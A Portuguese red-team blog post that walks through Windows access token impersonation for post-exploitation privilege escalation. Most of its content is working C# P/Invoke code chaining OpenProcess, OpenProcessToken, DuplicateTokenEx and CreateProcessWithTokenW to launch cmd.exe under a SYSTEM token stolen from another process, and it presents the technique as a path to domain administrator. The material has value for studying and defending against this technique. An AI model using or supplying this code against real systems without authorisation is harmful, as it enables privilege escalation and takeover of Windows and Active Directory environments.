---
title: "Token Impersonation: uma abordagem mais interna."
date: 2024-01-03 00:00:00 +0800
categories: [Windows, Tokens]
tags: [Red Team]
---

Durante o período de pós-exploração, o invasor na maioria das vezes busca o maior nível de privilégio na rede.

No contexto de Active Directory, esse nível de privilégio é, por muitas vezes, conferidas ao Administrador de Domínio, onde o atacante almeja este acesso. E os inúmeros vetores de ataques no Windows contribuem para isso.

Hoje, vamos conferir uma abordagem mais interna num vetor de ataque bastante interessante e que já me rendeu uma elevação de privilégio ao domain admin: **Token Impersonation**.

![Desktop View](https://i.imgur.com/h8bSnnQ.png){: width="350" height="250" }

## Um breve contexto

Todo processo no Windows possui um Token de Acesso¹. A importância deste token para o invasor são os respectivos privilégios que estão embutidos nele.

>Token de Acesso¹: Um token de acesso contém as informações de segurança de uma sessão de logon. O sistema cria um token de acesso quando um usuário faz logon e cada processo executado em nome do usuário tem uma cópia do token.\\
O token identifica o usuário, os grupos do usuário e os privilégios do usuário. O sistema usa o token para controlar o acesso a objetos protegíveis e controlar a capacidade do usuário de executar várias operações relacionadas ao sistema no computador local.
{: .prompt-info }

O impacto deste ataque reflete diretamente na elevação de privilégio do invasor. Por não se tratar somente de ataques a usuários locais, atacantes também podem comprometer usuários de alto valor no domínio, como administradores de domínios, operadores de contas, entre outros.

Internamente, o ataque é dividido nas seguintes etapas:

- Obter o token do processo alvo;
- Duplicar o token recém-obtido;
- Criar um processo passando o token duplicado.

Tendo em vista a importância do ataque e a teoria dele, vamos partir para o código! =]

## OpenProcess

Primeiramente, precisamos garantir um handle ao processo que queremos o token. Uma das APIs próprias para isso é a `OpenProcess`.

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(
	uint dwDesiredAccess,
	bool bInheritHandle,
	uint dwProcessId
);
```

Como visto no primeiro argumento da API, `dwDesiredAccess` simboliza o nível de permissão que o handle aberto terá. A permissão mínima para o handle inicial necessária para o ataque é `PROCESS_QUERY_LIMITED_INFORMATION²`, conforme dita na documentação da Microsoft.

![Desktop View](https://blackmetal2000.github.io/assets/img/tokens/imagem1.png)

```csharp
IntPtr hProcess = Impersonate.PInvokes.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, 4404); // 4404 = pid
if (hProcess == IntPtr.Zero)
{
	Console.WriteLine($"OpenProcess ERROR: {Marshal.GetLastWin32Error()}");
	Environment.Exit(0);
}

Console.WriteLine($"[+] (OpenProcess) Initial Handle: 0x{hProcess.ToString("X")}");
Impersonate.PInvokes.CloseHandle(hProcess);
```

>`PROCESS_QUERY_LIMITED_INFORMATION²`: permissão utilizada para descobrir certas informações limitadas sobre um processo.
{: .prompt-info }

## OpenProcessToken

O próximo passo é obter o token do processo representado pelo handle recém-aberto. É este token que será, futuramente, duplicado e impersonificado.

```csharp
[DllImport("advapi32.dll", SetLastError=true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(
	IntPtr ProcessHandle, // handle do processo alvo.
	UInt32 DesiredAccess, // nível de acesso do token.
	out IntPtr TokenHandle // o resultado da API, o token.
);
```

Como visto, é solicitado um nível de acesso representado pelo `DesiredAccess`, similarmente ao que ocorre na abertura do handle com o `OpenProcess`. Neste caso, o único privilégio necessário para atribuirmos ao handle do token seria o de `TOKEN_DUPLICATE³`. Estes privilégios estão representados [nesta documentação](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects).

```csharp
bool result = Impersonate.PInvokes.OpenProcessToken(hProcess, TOKEN_DUPLICATE, out IntPtr hToken);

if (result == false)
{
	Console.WriteLine($"OpenProcessToken ERROR: {Marshal.GetLastWin32Error()}");
	Environment.Exit(0);
}

Console.WriteLine($"[+] (OpenProcessToken) Token Handle: 0x{hToken.ToString("X")}");
```

>`TOKEN_DUPLICATE³`: permissão necessária para duplicar um token de acesso.
{: .prompt-info }

## DuplicateTokenEx

Posterior à etapa de obter o token do processo, o próximo passo é duplicá-lo. Para isso, a API `DuplicateTokenEx` cumpre este papel. 

```csharp
public enum TokenAccess : uint
{
	STANDARD_RIGHTS_REQUIRED = 0x000F0000,
	STANDARD_RIGHTS_READ = 0x00020000,
	TOKEN_ASSIGN_PRIMARY = 0x0001,
	TOKEN_DUPLICATE = 0x0002,
	TOKEN_IMPERSONATE = 0x0004,
	TOKEN_QUERY = 0x0008,
	TOKEN_QUERY_SOURCE = 0x0010,
	TOKEN_ADJUST_PRIVILEGES = 0x0020,
	TOKEN_ADJUST_GROUPS = 0x0040,
	TOKEN_ADJUST_DEFAULT = 0x0080,
	TOKEN_ADJUST_SESSIONID = 0x0100,
	TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
	TOKEN_ALL_ACCESS = ( STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID)
}

public enum SECURITY_IMPERSONATION_LEVEL
{
	SecurityAnonymous = 0,
	SecurityIdentification = 1,
	SecurityImpersonation = 2,
	SecurityDelegation = 3
}

public enum TOKEN_TYPE
{
	TokenPrimary = 1,
	TokenImpersonation
}

[DllImport("advapi32.dll", CharSet=CharSet.Auto, SetLastError=true)]
public extern static bool DuplicateTokenEx(
	IntPtr hExistingToken, // handle do token original
	uint dwDesiredAccess, // permissões que o token duplicado terá
	IntPtr lpTokenAttributes, // especifica o descritor de segurança e valida se os processos filhos herdam o token
	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, // nível de impersonation do token
	TOKEN_TYPE TokenType, // tipo do token (primario ou impersonation)
	out IntPtr phNewToken // o resultado da API, o token duplicado
);
```

Algumas declarações no código são de grande valia para o funcionamento da API. São elas:

- `TokenAccess`: enum que contém valores para o nível de privilégio do token duplicado.
- `SECURITY_IMPERSONATION_LEVEL`: enum que contém os valores que representam os [níveis de impersonificação](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level).
- `TOKEN_TYPE`: enum que contém valores que diferenciam o token de um [primário e impersonation](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type).

Nesta API, é importante nos atentarmos no `dwDesiredAccess`. Ele representa o [nível de acesso](https://learn.microsoft.com/pt-br/windows/win32/secauthz/access-rights-for-access-token-objects) do token duplicado. É possível requisitar o mesmo nível de acesso do token original passando o valor "0".

```csharp
bool result = Impersonate.PInvokes.DuplicateTokenEx(
	hToken, // token original
	(uint)Impersonate.PInvokes.TokenAccess.TOKEN_ALL_ACCESS, // especificando todos os privilégios ao token duplicado
	IntPtr.Zero, // descritor de segurança padrão
	Impersonate.PInvokes.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, // permissão para impersonificar no sistema local
	Impersonate.PInvokes.TOKEN_TYPE.TokenImpersonation, // indica um impersonation token
	out IntPtr phNewToken // token duplicado
);

if (result == false)
{
	Console.WriteLine($"DuplicateTokenEx ERROR: {Marshal.GetLastWin32Error()}");
	Environment.Exit(0);
}

Console.WriteLine($"[+] (DuplicateTokenEx) Duplicated Token Handle: 0x{phNewToken.ToString("X")}");
```

## CreateProcessWithTokenW

Agora que já possuímos o token duplicado `phNewToken`, o último passo é criar um processo especificando o token recém-obtido. Se tudo der certo, o processo criado terá as permissões do usuário que está rodando o processo que especificamos na API `OpenProcess`. Para isso, a API `CreateProcessWithTokenW` se faz presente.

```csharp
[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
public static extern bool CreateProcessWithTokenW(
	IntPtr hToken, // handle do token duplicado
	LogonFlags dwLogonFlags, // tipo de logon realizado
	string lpApplicationName, // aplicação que será iniciada
	string lpCommandLine, // argumentos da aplicação, pode ser vazio
	CreateProcessFlags dwCreationFlags, // sinalizadores de como o processo é criado
	IntPtr lpEnvironment, // bloco de ambiente para o novo processo, pode ser vazio
	string lpCurrentDirectory, // path do diretório atual, pode ser vazio
	[In] ref STARTUPINFO lpStartupInfo, // um ponteiro para uma estrutura STARTUPINFO ou STARTUPINFOEX
	out PROCESS_INFORMATION lpProcessInformation // saída da API, é o identificador do processo
);
```

Note que estamos criando um novo processo do zero especificando o token de segurança no argumento `hToken`. Vale ressaltar que:

- `LogonFlags`: enum que contém valores para o tipo de logon que será realizado quando o processo for aberto. Existem dois tipos: `LOGON_WITH_PROFILE⁴` e `LOGON_NETCREDENTIALS_ONLY⁵`. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).
- `CreateProcessFlags`: enum que contém valores de como o processo será criado, como: `CREATE_NO_WINDOW` para não criar janela, `CREATE_PROTECTED_PROCESS` para criar um processo protegido, entre outros. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/procthread/process-creation-flags).
- `STARTUPINFO`: struct que contém valores sobre estações de janelas, área de trabalho, aparência da janela de um processo, entre outros. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa).
- `PROCESS_INFORMATION`: struct que contém valores sobre informações do processo recém-criado. [Veja aqui](https://learn.microsoft.com/pt-br/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information).

```csharp
Impersonate.PInvokes.STARTUPINFO si = new Impersonate.PInvokes.STARTUPINFO();
Impersonate.PInvokes.PROCESS_INFORMATION processInformation = new Impersonate.PInvokes.PROCESS_INFORMATION();

bool result = Impersonate.PInvokes.CreateProcessWithTokenW(
	phNewToken,
	Impersonate.PInvokes.LogonFlags.LOGON_NETCREDENTIALS_ONLY,
	@"C:\Windows\System32\cmd.exe",
	null,
	0,
	IntPtr.Zero,
	null,
	ref si,
	out processInformation
);

if (result == false)
{
	Console.WriteLine($"CreateProcessWithTokenW ERROR: {Marshal.GetLastWin32Error()}");
	Environment.Exit(0);
}

Console.WriteLine("[+] (CreateProcessWithTokenW) Success!");
```

Feito isso, caso a execução da API seja um sucesso, um novo processo "cmd.exe" será criado com o nível de permissão que almejamos graças ao token de segurança. Neste caso, especificamos um processo que está rodando como `NT AUTHORITY\SYSTEM`.

![Desktop View](https://blackmetal2000.github.io/assets/img/tokens/imagem3.png)
